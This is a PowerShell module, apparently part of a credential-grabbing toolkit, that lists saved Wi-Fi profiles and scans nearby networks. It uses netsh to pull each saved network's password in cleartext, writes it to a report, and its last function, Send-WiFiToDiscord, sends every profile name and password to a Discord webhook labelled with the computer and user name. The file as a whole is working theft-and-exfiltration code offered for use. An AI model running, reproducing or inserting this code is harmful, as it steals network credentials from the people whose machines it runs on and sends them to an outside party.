<#
.SYNOPSIS
    WiFi information extraction module
.DESCRIPTION
    Extracts saved WiFi profiles with passwords and nearby networks
#>

function Get-SavedWiFiProfiles {
    param(
        [switch]$IncludePasswords
    )

    $profiles = @()

    try {
        $profileList = netsh wlan show profiles 2>$null | Select-String "All User Profile\s+:\s(.+)" | ForEach-Object {
            $_.Matches.Groups[1].Value.Trim()
        }

        foreach ($profileName in $profileList) {
            $profileData = [PSCustomObject]@{
                ProfileName = $profileName
                Password = $null
                Authentication = $null
                Encryption = $null
            }

            if ($IncludePasswords) {
                $profileDetails = netsh wlan show profile name="$profileName" key=clear 2>$null
                
                $passwordMatch = $profileDetails | Select-String "Key Content\s+:\s(.+)"
                if ($passwordMatch) {
                    $profileData.Password = $passwordMatch.Matches.Groups[1].Value.Trim()
                }

                $authMatch = $profileDetails | Select-String "Authentication\s+:\s(.+)"
                if ($authMatch) {
                    $profileData.Authentication = $authMatch.Matches.Groups[1].Value.Trim()
                }

                $encMatch = $profileDetails | Select-String "Cipher\s+:\s(.+)"
                if ($encMatch) {
                    $profileData.Encryption = $encMatch.Matches.Groups[1].Value.Trim()
                }
            }

            $profiles += $profileData
        }
    } catch {
        Write-Output "Error retrieving WiFi profiles: $($_.Exception.Message)"
    }

    return $profiles
}

function Get-NearbyWiFiNetworks {
    try {
        $networks = @()
        $currentNetwork = $null
        
        $netshOutput = netsh wlan show networks mode=Bssid 2>$null
        
        foreach ($line in $netshOutput) {
            if ($line -match "^SSID \d+ : (.+)") {
                if ($currentNetwork) {
                    $networks += $currentNetwork
                }
                $currentNetwork = [PSCustomObject]@{
                    SSID = $matches[1].Trim()
                    NetworkType = $null
                    Authentication = $null
                    Encryption = $null
                    BSSID = @()
                    Signal = @()
                    RadioType = @()
                    Channel = @()
                }
            }
            elseif ($line -match "Network type\s+:\s(.+)" -and $currentNetwork) {
                $currentNetwork.NetworkType = $matches[1].Trim()
            }
            elseif ($line -match "Authentication\s+:\s(.+)" -and $currentNetwork) {
                $currentNetwork.Authentication = $matches[1].Trim()
            }
            elseif ($line -match "Encryption\s+:\s(.+)" -and $currentNetwork) {
                $currentNetwork.Encryption = $matches[1].Trim()
            }
            elseif ($line -match "BSSID \d+\s+:\s(.+)" -and $currentNetwork) {
                $currentNetwork.BSSID += $matches[1].Trim()
            }
            elseif ($line -match "Signal\s+:\s(.+)" -and $currentNetwork) {
                $currentNetwork.Signal += $matches[1].Trim()
            }
            elseif ($line -match "Radio type\s+:\s(.+)" -and $currentNetwork) {
                $currentNetwork.RadioType += $matches[1].Trim()
            }
            elseif ($line -match "Channel\s+:\s(.+)" -and $currentNetwork) {
                $currentNetwork.Channel += $matches[1].Trim()
            }
        }
        
        if ($currentNetwork) {
            $networks += $currentNetwork
        }
        
        return $networks
    } catch {
        Write-Output "Error scanning nearby networks: $($_.Exception.Message)"
        return @()
    }
}

function Export-WiFiReport {
    param(
        [string]$OutputPath,
        [switch]$IncludePasswords
    )

    $report = @"
====================================================================================================
WIFI INFORMATION REPORT
Generated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
====================================================================================================

SAVED WIFI PROFILES
----------------------------------------------------------------------------------------------------
"@

    $profiles = Get-SavedWiFiProfiles -IncludePasswords:$IncludePasswords
    
    if ($profiles.Count -gt 0) {
        if ($IncludePasswords) {
            $report += ($profiles | Format-Table ProfileName, Password, Authentication, Encryption -AutoSize | Out-String)
        } else {
            $report += ($profiles | Format-Table ProfileName -AutoSize | Out-String)
        }
    } else {
        $report += "No saved WiFi profiles found.`n"
    }

    $report += @"

NEARBY WIFI NETWORKS
----------------------------------------------------------------------------------------------------
"@

    $nearby = Get-NearbyWiFiNetworks
    
    if ($nearby.Count -gt 0) {
        foreach ($network in $nearby) {
            $report += "`nSSID: $($network.SSID)`n"
            $report += "  Network Type: $($network.NetworkType)`n"
            $report += "  Authentication: $($network.Authentication)`n"
            $report += "  Encryption: $($network.Encryption)`n"
            
            for ($i = 0; $i -lt $network.BSSID.Count; $i++) {
                $report += "  BSSID $($i+1): $($network.BSSID[$i])`n"
                if ($network.Signal[$i]) { $report += "    Signal: $($network.Signal[$i])`n" }
                if ($network.RadioType[$i]) { $report += "    Radio Type: $($network.RadioType[$i])`n" }
                if ($network.Channel[$i]) { $report += "    Channel: $($network.Channel[$i])`n" }
            }
        }
    } else {
        $report += "No nearby WiFi networks detected.`n"
    }

    $report += "`n====================================================================================================`n"

    $report | Out-File -FilePath $OutputPath -Encoding UTF8
    Write-Output "WiFi report exported to: $OutputPath"
}

function Send-WiFiToDiscord {
    param(
        [Parameter(Mandatory=$true)]
        [string]$WebhookUrl
    )

    try {
        $profiles = Get-SavedWiFiProfiles -IncludePasswords
        
        foreach ($profile in $profiles) {
            $body = @{
                username = "$env:COMPUTERNAME\$env:USERNAME"
                content = "**WiFi Profile:** $($profile.ProfileName)`n**Password:** $($profile.Password)"
            } | ConvertTo-Json

            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json' | Out-Null
            Start-Sleep -Milliseconds 500
        }
        
        Write-Output "WiFi profiles sent to Discord"
    } catch {
        Write-Output "Error sending to Discord: $($_.Exception.Message)"
    }
}